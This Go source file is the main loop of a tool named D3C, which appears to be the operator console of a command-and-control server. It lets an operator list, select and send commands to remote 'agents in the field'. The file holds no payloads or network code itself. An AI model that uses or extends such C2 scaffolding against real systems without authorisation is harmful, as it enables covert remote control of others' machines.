package main

import (
	"bufio"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"d3c/commons/interfaces"
	"d3c/server/commands"
	. "d3c/server/helpers"
	"log"
	"os"
	"strings"
)

var (
	agentesEmCampo    = []estruturas.Mensagem{}
	agenteSelecionado = ""
)

func main() {
	log.Println("Entrei em execução.")

	cliHandler()
}

func cliHandler() {
	for {
		if agenteSelecionado != "" {
			print(agenteSelecionado + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)

		comandoCompleto, _ := reader.ReadString('\n')
		comandoCompleto = strings.Trim(comandoCompleto, "\r")
		comandoCompleto = strings.Trim(comandoCompleto, "\n")

		comandoSeparado := helpers.SeparaComando(comandoCompleto)
		comandoBase := strings.TrimSpace(comandoSeparado[0])

		if len(comandoBase) > 0 {
			comandoId := ValidaComando(comandoBase)

			mapping := map[int]interfaces.Command{
				0: commands.Default{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				1: commands.Show{ComandoCompleto: comandoCompleto, AgentesEmCampo: &agentesEmCampo},
				2: commands.Sleep{ComandoCompleto: comandoCompleto, AgenteAlvo: agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				3: commands.Select{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				4: commands.Send{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				5: commands.Get{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				6: commands.Set{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				7: commands.Start{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
			}

			mapping[comandoId].Executar()
		}

	}

}
